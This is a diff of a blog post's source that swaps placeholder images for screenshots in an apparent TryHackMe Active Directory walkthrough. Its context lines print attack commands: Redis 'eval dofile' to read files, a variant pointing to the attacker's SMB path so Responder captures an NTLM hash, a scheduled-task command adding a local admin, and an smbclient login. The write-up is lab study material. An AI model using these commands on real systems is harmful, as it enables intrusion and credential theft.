@@ -62,13 +62,13 @@ A Golden Ticket attack is a type of attack in which an attacker gains access to 
 
 This room on tryhackme is all about active directory and domain controller. So let's begin our machine with Nmap scanning.
 
-![Initial Enumeration](/placeholder.svg?height=400&width=800&text=Nmap+Initial+Scan)
+![Initial Enumeration](/placeholder.svg?height=400&width=800&text=Initial+Enumeration+Screenshot)
 
 Every domain controller services are up and running which is part of AD DC. But \`Kerberos\` is not running so we can not [AS-REP](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/) roasting the usernames to check if they are valid.
 
 I ran the Nmap to scan all ports.
 
-![All Ports Scan](/placeholder.svg?height=400&width=800&text=Nmap+All+Ports+Scan)
+![All Ports Scan](/blog-images/vulnet-nmap-all.jpg)
 
 Here many ports are open so it is always beneficial to check for all ports. RPC and LDAP services are also running, Smb is a very good option to start with and I did the same.
 
@@ -82,12 +82,12 @@ It confirms that no guest and a null session are allowed.
 But my eyes got on to port 6379 (Redis). I was unaware of this but [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) are always a good option to search for anything.
 Redis is a No-sql database that stores information alongside key-value called keyspaces. The version of Redis key-value store 2.8.2402 is vulnerable to ssrf + CRLF.
 
-![Redis Exploitation](/placeholder.svg?height=400&width=800&text=Redis+Exploitation)
+![Redis Exploitation](/blog-images/vulnet-redis.jpg)
 
 Here we can exploit Redis via ssrf, but we must know the path to the windows server files
 \`redis-cli -h 10.10.245.19 eval "dofile('C:\\\\\\Users\\\\\\enterprise-security\\\\\\Desktop\\\\\\users.txt')" 0\`
 
-![Redis Command Execution](/placeholder.svg?height=400&width=800&text=Redis+Command+Execution)
+![Redis Command Execution](/blog-images/vulnet-redis-exp.jpg)
 
 we got the users.txt flag. If we can get any files why not exploit further to get Authenticated user's NTLM hash? If we forge redis to connect back to our attacking machine, maybe users' hashes will be exposed.
 
@@ -97,7 +97,7 @@ I set up the responder from impacket, when users from the Redis server try to co
 
 \`redis-cli -h 10.10.245.19 eval "dofile('//10.9.0.31/test')" 0\`
 
-![Responder Hash Capture](/placeholder.svg?height=400&width=800&text=Responder+Hash+Capture)
+![Responder Hash Capture](/blog-images/vulnet-responder.jpg)
 
 Since we got the user enterprise-security hash, we cracked with john the ripper and got the password.
 
@@ -151,7 +151,7 @@ Author vulnnet\\administrator Command "cmd.exe" Arguments "/c net localgroup adm
 
 We can access admin via smbclient.
 \`smbclient //10.10.56.175/C$ -U 'enterprise-security' sand_………...\`
-      `,
+    `,
       date: "2024-03-10",
       readingTime: "10 min read",
       tags: ["TryHackMe", "Active Directory", "Penetration Testing", "Walkthrough"],
